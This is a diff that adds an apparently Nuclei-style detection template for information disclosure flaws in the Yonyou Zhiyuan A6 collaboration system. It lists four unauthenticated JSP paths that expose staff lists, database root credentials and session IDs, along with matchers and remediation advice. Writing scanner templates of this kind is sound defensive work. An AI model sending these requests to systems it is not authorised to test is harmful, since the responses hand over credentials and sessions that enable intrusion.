@@ -1,0 +1,40 @@
+id: wooyun-2015-0110538
+info:
+  name: Yonyou Zhiyuan A6 Multiple Sensitive Information Disclosures
+  author:
+  - 折跃
+  description: |-
+    Yonyou Zhiyuan A6 Multiple Sensitive Information Disclosure Vulnerabilities
+    Yonyou Zhiyuan A6 Collaborative Management System is an efficient web-based collaborative work platform and an excellent collaborative management system.
+
+    Yonyou Zhiyuan A6 has a sensitive information disclosure vulnerability. An attacker can craft payloads to obtain sensitive information.
+  severity: high
+  remediation: |-
+    Official remediation:
+    1. It is recommended that users obtain the latest patch or the latest version of the program from the vendor:
+    https://www.seeyon.com/
+
+    Temporary remediation:
+    1. Remove sensitive information exposed on pages, cookies, or caches, or delete the pages that leak information
+    2. Encrypt sensitive information at rest and avoid sending it to the frontend unless necessary
+    3. Enforce strict permission authentication for sensitive data that must be sent and for page request APIs
+requests:
+- matchers:
+  - type: dsl
+    condition: or
+    dsl:
+    - status_code_1==200 && contains(body_1,'personList') && contains(body_1,'new
+      Person')
+    - status_code_2==200 && contains(body_2,'localhost') && contains(body_2,'root')
+    - status_code_3==200 && contains(body_3,'Session') && contains(body_3,'sessionID')
+    - status_code_4==200 && contains(body_4,'localhost') && contains(body_4,'new root')
+  path:
+  - '{{BaseURL}}/yyoa/common/selectPersonNew/initData.jsp?trueName=1'
+  - '{{BaseURL}}/yyoa/createMysql.jsp'
+  - '{{BaseURL}}/yyoa/ext/https/getSessionList.jsp?cmd=getAll'
+  - '{{BaseURL}}/yyoa/ext/createMysql.jsp'
+  method: GET
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
+  stop-at-first-match: true
